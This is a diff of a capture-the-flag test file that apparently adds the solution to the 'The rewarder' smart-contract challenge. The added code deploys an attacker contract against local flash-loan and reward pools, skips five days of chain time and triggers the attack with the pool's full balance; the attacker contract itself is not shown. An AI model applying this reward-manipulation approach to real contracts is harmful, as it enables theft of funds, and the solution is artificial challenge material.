@@ -9,6 +9,7 @@ describe('[Challenge] The rewarder', function () {
     const TOKENS_IN_LENDER_POOL = ethers.utils.parseEther('1000000'); // 1 million tokens
 
     before(async function () {
+        this.timeout(20000);
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
         [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
@@ -65,7 +66,16 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const RewarderAttackerfactory = await ethers.getContractFactory('RewarderAttacker', deployer);
+        const attackerContract = await RewarderAttackerfactory.deploy(
+            this.liquidityToken.address,
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.rewardToken.address,
+            attacker.address
+        );
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // wait 5 days
+        await attackerContract.connect(attacker).attack(TOKENS_IN_LENDER_POOL);
     });
 
     after(async function () {
@@ -80,7 +90,7 @@ describe('[Challenge] The rewarder', function () {
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
             let rewards = await this.rewardToken.balanceOf(users[i].address);
-            
+
             // The difference between current and previous rewards balance should be lower than 0.01 tokens
             let delta = rewards.sub(ethers.utils.parseEther('25'));
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
